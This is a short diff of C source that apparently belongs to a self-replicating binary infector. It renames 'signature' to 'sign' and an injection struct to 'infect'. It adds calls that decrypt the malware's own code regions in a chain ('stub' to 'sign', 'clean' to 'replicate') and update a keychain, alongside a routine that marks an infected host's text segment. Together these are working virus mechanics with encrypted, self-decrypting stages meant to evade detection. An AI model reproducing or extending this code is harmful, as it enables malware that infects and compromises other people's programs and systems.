@@ -38,12 +38,13 @@ __attribute__((always_inline)) static inline void sign_infection(char *dst, cons
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void signature(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection)
+void sign(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)
 {
-
 #if LOGGER
 	MID_LOGGER("key:\t\t\t");
 #endif
+
+	decrypt_right(keychain, (char *)stub, (void *)sign - (void *)stub);
 
 	if (context == FAILURE)
 		goto label;
@@ -51,8 +52,11 @@ void signature(struct s_host *host, struct s_keychain *keychain, enum e_context 
 	unsigned char signature[SIGNATURE_SIZE];
 
 	generate_signature(signature);
-	sign_infection(injection->ptr, host->segment[TEXT], signature);
+	sign_infection(infect->ptr, host->segment[TEXT], signature);
 
 label:
-	clean(host, keychain, context, injection);
+	update_keychain_right(keychain, (char *)sign, (void *)clean - (void *)sign);
+	decrypt_right(keychain, (char *)clean, (void *)replicate - (void *)clean);
+
+	clean(host, keychain, context, infect);
 }
